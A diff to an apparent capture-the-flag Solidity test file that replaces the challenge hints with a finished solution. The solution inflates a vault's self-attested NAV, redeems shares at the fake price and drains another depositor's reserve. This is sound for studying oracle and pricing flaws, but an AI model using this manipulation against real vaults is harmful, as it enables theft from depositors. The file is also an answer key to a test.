@@ -102,14 +102,21 @@ contract FalseNavChallenge is Test {
     // Write your attack here — this is the only function you need to change
     ////////////////////////////////////////////////////////////////////////
     function test_falseNav() public checkSolvedByPlayer {
-        // Hint: the vault trusts navPerShare() for BOTH pricing (subscribe) and paying out
-        // (the queue). You can move that number. What is the cheapest path from "I can write
-        // the NAV" to "I hold more USDC than I started with"?
-        //
-        // Remember the queue: to be paid you must first subscribe (for shares), enqueue those
-        // shares to lock a payout at today's NAV, and then settle and claim.
-        //
-        // TODO: your code goes here
+        // 1. Buy in at the honest price — the entry itself is not manipulated.
+        usdc.approve(address(vault), INITIAL_PLAYER_BALANCE);
+        vault.subscribe(INITIAL_PLAYER_BALANCE);        // 1000e6 -> 1000e18 shares
+
+        // 2. Mark the fund up 100%. This is the chain's only window onto the
+        //    T-Bills; nothing contradicts it and the cash buffer has not moved.
+        vault.attest(int256(2 * PAR));                  // 1.00 -> 2.00
+
+        // 3. Redeem at the fake mark — the payout is locked at enqueue time.
+        tBill.approve(address(queue), 1_000e18);
+        queue.enqueue(1_000e18);                        // 1000e18 * 2.00 = 2000e6
+
+        // 4. Settle against the entire buffer and collect.
+        queue.settle(vault.reserveBalance());           // alice 1000e6 + mine 1000e6
+        queue.claim();
     }
 
     ////////////////////////////////////////////////////////////////////////
